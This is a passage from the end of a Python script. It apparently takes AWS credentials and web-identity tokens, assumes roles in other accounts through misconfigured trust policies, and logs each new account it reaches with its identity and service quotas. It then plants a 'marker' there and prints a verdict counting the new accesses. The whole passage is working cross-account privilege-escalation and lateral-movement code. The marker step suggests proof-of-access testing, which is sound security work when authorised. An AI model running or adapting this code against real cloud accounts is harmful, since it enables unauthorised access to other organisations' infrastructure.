                    _m = re.match(r'arn:aws:sts::(\d+):', res.get('assumed_arn') or '')
                    accid = _m.group(1) if _m else ''
                    if accid and accid != account:
                        new_accounts.append({'account': accid, 'via': 'webidentity:' + r['RoleName'],
                                             'creds': res['creds'], 'arn': res.get('assumed_arn')})
            elif dirs and ctx['account']:
                res = assume_role(cr0, r['Arn'])
                rec = {'role': r['RoleName'], 'arn': r['Arn'], 'via': 'AssumeRole',
                       'status': res['status'], 'code': res['code'], 'msg': cap(res['msg'], 300),
                       'assumed': res.get('assumed_arn'), 'trust': dirs[0].get('reason', '')[:300]}
                attempts.append(rec)
                say('DIRECT_ASSUME', json.dumps(rec)[:500])
        out['assume_attempts'] = json.dumps(attempts)[:20000]
    else:
        out['assume_attempts'] = 'NO_ID_TOKEN: ' + str(terr)
        say('ID_TOKEN_FAIL', str(terr))

    # 6) per NEW access: identity + quota + exactly one marker
    seen = set()
    newd = []
    for na in new_accounts:
        if na['account'] in seen or len(newd) >= 3:
            continue
        seen.add(na['account'])
        cr = na['creds']
        idn = get_identity(cr)
        q = [quota(cr, code, reg) for code in ('L-DB2E81BA', 'L-3819A6DF')
             for reg in ('eu-west-2', 'us-east-1')]
        rec = {'account': na['account'], 'name': na.get('name'), 'via': na['via'],
               'assumed_arn': na.get('arn'), 'identity': idn, 'quota': q}
        say('NEW_ACCESS', json.dumps(rec)[:900])
        try:
            rec['marker'] = marker_flow(cr, na['account'], REGION)
        except Exception as e:
            rec['marker'] = {'error': repr(e)[:300]}
        newd.append(rec)
    out['new_accesses'] = json.dumps(newd)[:120000]
    out['verdict'] = ('NEW_ACCESSES=%d' % len(newd)) if newd else 'NO_NEW_ACCOUNT'
    say('VERDICT', out['verdict'])

    out['raw_tail'] = cap('\n'.join(RAW[-120:]), 12000)
    txt = json.dumps(out)
    sys.stdout.write(txt)
    sys.stdout.write('\n')
    return 0


if __name__ == '__main__':
    sys.exit(main())
